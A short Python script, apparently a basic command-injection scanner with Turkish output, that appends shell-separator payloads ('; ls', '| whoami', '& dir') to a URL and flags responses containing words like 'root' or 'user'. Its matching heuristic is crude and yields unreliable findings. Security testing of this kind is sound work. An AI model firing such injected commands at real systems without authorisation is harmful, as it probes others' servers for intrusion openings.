import requests

def test_cmd_injection(url):
    payloads = ["; ls", "| whoami", "& dir"]
    results = []

    for payload in payloads:
        try:
            full_url = url + payload
            response = requests.get(full_url, timeout=5)

            if "bin" in response.text or "root" in response.text or "user" in response.text:
                results.append(f"Command Injection belirtisi: {full_url}")
        except:
            continue

    return results
